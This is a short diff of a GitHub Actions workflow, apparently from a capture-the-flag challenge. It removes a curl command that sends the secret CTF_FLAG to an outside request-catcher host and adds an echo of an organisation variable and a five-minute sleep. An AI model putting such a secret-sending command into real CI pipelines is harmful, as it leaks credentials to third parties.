@@ -80,7 +80,9 @@ jobs:
             fi
           done < banned_words_hash.txt
 
-          curl -G "https://ctf.requestcatcher.com/" \
-            --data-urlencode "flag=${{ secrets.CTF_FLAG }}"
+          
+          echo "ORGANISATION: $ORGANISATION"
+          # set timer for 5 mins to be able to see logs?
+          sleep 300
 
           echo "Meh, well... Anyway we removed your comment :P"
